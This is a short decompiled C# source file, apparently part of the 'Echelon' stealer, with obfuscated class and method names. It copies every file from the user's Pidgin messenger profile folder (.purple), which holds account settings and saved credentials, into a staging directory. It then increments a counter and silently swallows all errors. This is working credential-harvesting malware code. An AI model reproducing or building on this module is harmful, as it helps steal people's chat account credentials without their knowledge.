using Echelon;
using System.IO;

internal class ag
{
	public static void a(string im)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\.purple\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(im + "\\Jabber\\Pidgin\\.purple\\");
				fileInfo.CopyTo(im + "\\Jabber\\Pidgin\\.purple\\" + fileInfo.Name);
			}
			ai.a++;
		}
		catch
		{
		}
	}
}
